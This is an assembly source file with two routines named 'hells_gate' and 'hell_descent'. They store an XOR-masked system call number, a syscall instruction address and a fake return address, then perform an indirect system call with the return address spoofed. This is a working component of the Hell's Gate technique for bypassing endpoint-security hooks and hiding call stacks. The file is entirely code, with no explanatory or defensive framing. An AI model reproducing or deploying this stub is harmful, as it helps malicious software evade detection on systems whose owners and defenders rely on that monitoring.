.intel_syntax noprefix
.data
  wSystemCallEnc: .long 0
  qSyscallInsAddressEnc: .quad 0
  qFakeReturnEnc: .quad 0
  wMask: .long 0xDEADBEEF
  qMask: .quad 0xDEADBEEFDEADBEEF

.text
.global hells_gate
.global hell_descent

hells_gate:
  xor ecx, dword ptr [rip + wMask]
  mov dword ptr [rip + wSystemCallEnc], ecx
  xor rdx, qword ptr [rip + qMask]
  mov qword ptr [rip + qSyscallInsAddressEnc], rdx
  mov rax, r8
  xor rax, qword ptr [rip + qMask]
  mov qword ptr [rip + qFakeReturnEnc], rax
  ret

hell_descent:
  mov r10, rcx
  mov eax, dword ptr [rip + wSystemCallEnc]
  xor eax, dword ptr [rip + wMask]
  mov r11, qword ptr [rip + qSyscallInsAddressEnc]
  xor r11, qword ptr [rip + qMask]

  mov rcx, r9
  mov r9, qword ptr [rip + qFakeReturnEnc]
  xor r9, qword ptr [rip + qMask]
  test r9, r9
  jz   .Ldone
  push r9
.Ldone:
  mov r9, rcx
  jmp r11
